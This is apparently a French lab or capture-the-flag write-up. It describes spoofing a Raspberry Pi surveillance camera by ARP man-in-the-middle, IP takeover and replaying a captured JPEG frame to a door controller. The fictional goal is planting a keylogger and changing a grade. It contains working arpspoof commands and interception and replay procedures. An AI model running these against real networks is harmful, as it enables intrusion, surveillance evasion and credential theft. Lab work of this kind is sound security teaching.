# Attaque sur la camera

Sommaire:

1. [Rappel du sujet](#1-rappel-du-sujet)
2. [Remplacer la caméra](#2-remplacer-la-camera)
	1. [Intércepter une image](#21-intercepter-une-image)
	2. [IP usurpation](#22-ip-usurpation)
	3. [Envoyer des images](#23-envoyer-des-images)

## 1. Rappel du sujet

***La mission est d'entrer dans la salle des 4AS (option à l'INSA CVL en STI) afin de pouvoir brancher un Keylogger sur la machine de l'enseignant et pouvoir récupérer son mot de passe pour pouvoir changer sa note obtenue et avoir la moyenne. Comme vous êtes dans l'option 2SU, vous avez une porte qui mène directement dans la salle des 4AS, mais cette enseignant, suite à des problèmes entre des éleves à mis en place un système de carte surveillé par une caméra pour que seulement les professeurs puissent passer par la porte.***

***Pour que cette attaque soit indétectable, vous devez passer devant la caméra sans être vu, puis trouver un moyen de pirater le système de carte et ainsi ouvrir la porte.***

Maintenant que nous avons identifié comment les Raspberry Pi communiquent, l’objectif est de passer devant la caméra sans être détecté et sans déclencher l’indicateur lumineux signalant la coupure réseau entre les deux Raspberry Pi.

## 2. Remplacer la caméra

Dans cette solution, nous allons veiller à ce que les images transmises à la Raspberry Pi `protected door` soient les mêmes que celles envoyées par la caméra (il serait également possible d’envoyer des images personnalisées).

### 2.1. Intércepter une image

Pour cette première étape, nous allons intercepter une image transmise par la caméra afin de la retransmettre ultérieurement.

Le code `srcs/get_payload.py` permet d’intercepter toutes les communications qui passent par la carte réseau. Lorsqu’une nouvelle connexion de `cam` vers `protected door`, il est nécessaire de vérifier si la trame contient le premier paquet de l’image. Cela est possible car le paquet est sous la forme :

```text
1BFC
--BoundaryString
Content-type: image/jpeg
Content-Length:      7089

...
```

Nous avons la chaine `--BoundaryString` qui est toujours présente dans le premier paquet de l’image et qui reste constante. Nous pouvons donc nous baser sur cela pour l’identifier.

Ensuite, comme nous avons la taille de l’image dans le `Content-Length`, nous pouvons compter le nombre de données reçues pour identifier si nous avons reçu l’image au complet, et ainsi sauvegarder l’image intercepté

Enfin, le code permet de faire la passerelle entre les deux machines en changeant les adresses MAC avant de les transmettre.

Pour exécuter le code, suivez les étapes suivantes.

Commencez par exécuter ces deux commandes sur deux terminaux pour effectuer un Man-In-The-Middle.
```bash
# Premier terminal
$ arpspoof -i wlan0 -t 192.168.1.2 192.168.1.5
```

```bash
# Second terminal
$ arpspoof -i wlan0 -t 192.168.1.5 192.168.1.2
```

Pour effectuer cette attaque, assurez-vous que le forwarding soit désactivé. Le code s’en charge automatiquement.
```bash
$ echo 0 > /proc/sys/net/ipv4/ip_forward
``` 

Puis pour finir, il faut exécuter le code python qui intercepte l’image :
```bash
$ python3 get_payload.py
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
Image sniffing with 7089 size
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
.
Send 1 packets.
Saving of payload size of 7089
.
Send 1 packets.
.
Send 1 packets.
...
``` 

À cette étape, vous pouvez arrêter tous les terminaux, car le fichier `payload.bin` a été généré, contenant la première image transmise par la caméra.

### 2.2. IP usurpation

Maintenant que nous avons l’image que nous voulons transmettre, il faut pouvoir se faire passer pour la `cam`. Pour cela, nous allons changer notre adresse IP pour obtenir celle de la caméra.

Pour cette étape, nous allons commencer par transmettre au routeur des paquets ARP pour lui indiquer que l’adresse `192.168.1.2` est associée à notre adresse MAC.

```bash
# premier terminal
$ arpspoof -i wlan0 -t 192.168.1.1 192.168.1.2
```

Ensuite, nous allons effectuer des pings en continu vers `protected door` pour deux raisons. La première est de lui indiquer que lors du changement de l’adresse IP, il doit associer l’adresse MAC à la nouvelle adresse IP pour ne pas continuer à envoyer des paquets à `cam`. La seconde raison est de vérifier si le changement de l’adresse IP a été accepté par le
switch (si le ping continue, cela signifie que nous avons bien récupéré l’IP, rendant ainsi `cam`inaccessible).

```bash
# second terminal
$ ping 192.168.1.5
```

aintenant que ces commandes sont exécutées, nous pouvons attendre quelques minutes avant de procéder au changement de l’adresse IP.

À cette étape, la communication se poursuit encore sans que la LED orange ne s’allume (LED de détection de coupure réseau entre `cam` et `protected door`).

Il suffit maintenant de changer les paramètres wifi comme indiqué sur l’image ci-dessous.

![wifi_setting](./imgs/01_wifi_setting.png "wifi_setting")

Ensuite, déconnectez puis reconnectez le WiFi. Pour vérifier que l’usurpation s’est bien produite, assurez-vous d’avoir l’adresse IP `192.168.1.2`, que le ping continue de se faire, et enfin, vérifiez que la LED orange s’est allumée.

![verify_ip](./imgs/02_verify_ip.png "verify_ip")

Dans la suite de cette attaque, vous pouvez laisser le terminal qui effectue les pings actif.

### 2.3. Envoyer des images

Maintenant que nous avons obtenu l’adresse l'IP `192.168.1.2`, vous pouvez utiliser le code `srcs/cam.py`, qui ouvre une socket sur le port  `8081` et transmet en boucle l’image que nous avons interceptée précédemment.

```bash
$ python3 cam.py
Server UP at 0.0.0.0:8081
Connection de ('192.168.1.5', 54294)
Connection de ('192.168.1.5', 54308)
Connection de ('192.168.1.5', 33808)
...
```

Maintenant, nous pouvons passer devant la `cam`  sans être détectés, car nous nous faisons passer pour la caméra.

--------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------

La première image montre que la LED orange est allumée avant l’envoi des images
![before_hack](./imgs/03_before_hack.png "before_hack")

Puis une fois les images envoyées, la LED allumée est la verte, ce qui correspond au fait que personne n’est devant la caméra.
![after_hack](./imgs/04_after_hack.png "after_hack")


Maintenant, nous pouvons poursuivre notre attaque en essayant d’ouvrir la porte.
